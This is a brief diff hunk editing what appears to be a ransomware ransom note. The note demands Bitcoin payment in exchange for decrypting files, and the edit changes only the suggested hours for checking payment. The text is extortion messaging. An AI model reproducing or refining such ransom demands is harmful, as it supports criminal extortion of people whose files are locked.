@@ -19,7 +19,7 @@ payment is accepted in Bitcoin only. For more information, click <About bitcoin>
 Please check the current price of Bitcoin and buy some bitcoins. For more information
 click <How to buy bitcoins>.
 And send the correct amount to the address specified in this window.
-After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am
+After your payment, click <Check Payment>. Best time to check: 3:00pm - 5:00pm
 GMT from Monday to Friday.
 Once the payment is checked, you can start decrypting your files immediately.
 
